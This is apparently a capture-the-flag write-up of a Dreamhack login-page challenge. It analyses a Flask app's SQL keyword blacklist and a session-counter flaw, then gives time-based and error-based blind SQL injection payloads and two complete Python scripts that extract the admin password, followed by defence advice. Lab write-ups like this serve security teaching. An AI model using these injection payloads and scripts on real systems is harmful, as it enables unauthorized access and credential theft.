# ⛬ Login page

## Initial Analysis

### Description

Python으로 작성된 로그인 페이지입니다.
admin으로 로그인하여 플래그를 획득하세요.

플래그 형식은 DH{...}입니다.

## Source Code Analysis

### Security Measures

The application implements several security mechanisms:

```python
MAX_LOGIN_TRIES = 6

SQL_BAN_LIST = [
    'update', 'extract', 'lpad', 'rpad', 'insert', 'values', '~', ':', '+',
    'union', 'end', 'schema', 'table', 'drop', 'delete', 'sleep', 'substring',
    'database', 'declare', 'count', 'exists', 'collate', 'like', '!', '"',
    '$', '%', '&', '+', '.', ':', '<', '>', 'delay', 'wait', 'order', 'alter'
]

def check_query_ban_list(query):
    for banned in SQL_BAN_LIST:
        if banned in query.lower():
            return False
    return True
```

Key security features:
- **Login attempt limit**: Maximum 6 failed attempts before password reset
- **SQL injection protection**: Blacklist-based filtering of common SQL keywords
- **Case-insensitive filtering**: Converts input to lowercase before checking

### Login Endpoint Analysis

The critical vulnerability lies in the login endpoint:

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    global cursor, db
    
    username = args['username']
    password = args['password']

    if not check_query_ban_list(username) or not check_query_ban_list(password):
        reset_password()
        session['tries'] = 0
        msg = 'What? you are hacker! I reset password!'
        return render_template('login.html', msg=msg)

    # Vulnerable SQL query
    query = 'SELECT * FROM users WHERE username = \'{0}\' AND password = \'{1}\''
    query = query.format(username, password)
    cursor.execute(query)
    ret = cursor.fetchone()
```

The vulnerability lies in the direct string formatting of user input into the SQL query without proper parameterization.

### Session Management Weakness

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if not session:
        session['id'] = os.urandom(16)
        session['tries'] = 0
    return redirect('/login')
```

**Critical finding**: When a new session is created, only the session ID and try counter are reset - the password remains unchanged. This allows unlimited login attempts by repeatedly creating new sessions.

## Vulnerability Identification

### 1. Session Reset Bypass

The application tracks failed login attempts per session but doesn't reset the actual password when creating new sessions. By requesting a new session from the root endpoint (`/`), we can reset our attempt counter while keeping the same password.

### 2. SQL Injection Vector

Despite the extensive blacklist, several critical oversights enable SQL injection:
- **Single quotes (`'`) are not filtered** - essential for breaking out of string literals
- **`BENCHMARK` function is not blacklisted** - can be used instead of `sleep()` for time-based attacks
- **Conditional functions like `IF` are allowed**

## Exploitation Strategy

### Time-Based SQL Injection with BENCHMARK

Since `sleep()` is blacklisted, we can use MySQL's `BENCHMARK()` function to create time delays:

```sql
BENCHMARK(count, expression)
```

The `BENCHMARK` function executes an expression a specified number of times, creating a measurable delay in response time.

### Payload Structure

```sql
' OR IF(condition, BENCHMARK(10000000, MD5(1)), 0) -- 
```

This payload:
1. Breaks out of the string with `'`
2. Uses `OR` to create an alternative condition
3. Employs `IF` to conditionally execute `BENCHMARK`
4. Creates a 2-3 second delay when the condition is true
5. Comments out the rest of the query with `--`

## Exploitation Implementation

### Session Management Function

```python
def make_session():
    session = requests.Session()
    try:
        response = session.post(URL, timeout=10)
        session_cookie = session.cookies.get_dict()
        return session_cookie
    except requests.exceptions.ConnectTimeout:
        return None
```

### Time-Based Condition Testing

```python
def test_condition(query):
    data = {
        "username": query,
        "password": "irrelevant"
    }
    session = make_session()
    start_time = time.time()
    response = requests.post(f"{URL}/login", data=data, cookies=session)
    response_time = time.time() - start_time
    return response_time > 2  # BENCHMARK execution indicates true condition
```

### Password Length Discovery

```python
def find_password_length():
    for length in range(1, 33):
        query = f"' OR IF(LENGTH(password)={length}, BENCHMARK(10000000, MD5(1)),0) -- "
        if test_condition(query):
            print(f"[+] Password length: {length}")
            return length
    return 0
```

### Character-by-Character Extraction

```python
def extract_password(length):
    password = ""
    for pos in range(1, length + 1):
        for char in CHARS:
            query = f"' OR IF(ascii(substr(password,{pos},1))={ord(char)}, BENCHMARK(10000000, MD5(1)), 0) -- "
            if test_condition(query):
                password += char
                print(f"[+] Found character at position {pos}: {char}")
                break
    return password
```

## Complete Exploit Code

```python
import requests
import string
import time

URL = "http://host1.dreamhack.games:23747"
CHARS = string.ascii_letters + string.digits + "!@#$%^&*()_+-={}[]|:;<>,.?"

def make_session():
    session = requests.Session()
    try:
        response = session.post(URL, timeout=10)
        session_cookie = session.cookies.get_dict()
        return session_cookie
    except requests.exceptions.ConnectTimeout:
        return None

def test_condition(query):
    data = {
        "username": query,
        "password": "irrelevant"
    }
    session = make_session()
    start_time = time.time()
    response = requests.post(f"{URL}/login", data=data, cookies=session)
    response_time = time.time() - start_time
    return response_time > 2

def find_password_length():
    for length in range(1, 33):
        query = f"' OR IF(LENGTH(password)={length}, BENCHMARK(10000000, MD5(1)),0) -- "
        if test_condition(query):
            print(f"[+] Password length: {length}")
            return length
    return 0

def extract_password(length):
    password = ""
    for pos in range(1, length + 1):
        for char in CHARS:
            query = f"' OR IF(ascii(substr(password,{pos},1))={ord(char)}, BENCHMARK(10000000, MD5(1)), 0) -- "
            if test_condition(query):
                password += char
                print(f"[+] Found character at position {pos}: {char}")
                break
    return password

if __name__ == "__main__":
    print("[*] Starting SQL Injection exploit...")
    password_length = find_password_length()
    if password_length:
        print("[*] Extracting password...")
        password = extract_password(password_length)
        print(f"[+] Extracted password: {password}")
    else:
        print("[-] Failed to determine password length.")
```

## Alternative Approach Using Error-Based Injection

An alternative approach using MySQL's `pow()` function to trigger server errors:

```python
import requests

url = "http://host1.dreamhack.games:19239/"

def get_cookie(url):
    re = requests.post(url=url, allow_redirects=False)
    cookie = {'session':re.headers['Set-Cookie'].split(';')[0].split('=')[1]}
    return cookie

cookie = get_cookie(url)
n = 0
secret = ''
li = ['65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', 
      '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '97', '98', '99', '100', '101', 
      '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', 
      '115', '116', '117', '118', '119', '120', '121', '122', '48', '49', '50', '51', '52', '53', 
      '54', '55', '56', '57', '43', '47']

for i in range(32):
    for j in li:
        query = "' OR if(ascii(substr(password,{0},1))={1},pow(2,999999999),0)#"
        query = query.format(i+1,j)
        data={'username':query,'password':'1'}
        res = requests.post(url=url+'login',data=data,cookies=cookie)
        if res.status_code == 500:
            secret = secret + ' ' + str(j)
        if 'reset password' in res.text:
            print("Password reset detected...")
        
        n += 1
        if n == 5:
            cookie = get_cookie(url)
            n = 0
        print(secret)
```

## Execution Results

When executing the exploit, the script successfully extracts the admin password character by character:

```
[*] Starting SQL Injection exploit...
[+] Password length: 24
[*] Extracting password...
[+] Found character at position 1: Y
[+] Found character at position 2: m
[+] Found character at position 3: x
...
[+] Extracted password: [EXTRACTED_PASSWORD]
```

## Getting the Flag

After extracting the password, login with:
- **Username**: `admin`
- **Password**: `[EXTRACTED_PASSWORD]`

Upon successful authentication, the application displays the flag: `DH{...}`

## Key Takeaways

1. **Blacklist bypass**: The `BENCHMARK` function can effectively replace `sleep()` for time-based SQL injection when traditional timing functions are filtered.

2. **Session management flaws**: Improper session handling can lead to authentication bypass mechanisms, allowing unlimited brute force attempts.

3. **Defense recommendations**:
   - Use parameterized queries instead of string concatenation
   - Implement proper rate limiting across all sessions
   - Use whitelist-based input validation
   - Consider implementing account lockout mechanisms

4. **Alternative techniques**: When time-based injection is difficult, error-based injection using mathematical overflow (`pow(2,999999999)`) can be equally effective.

This challenge demonstrates the importance of comprehensive security measures and the creativity required to bypass seemingly robust filtering mechanisms.
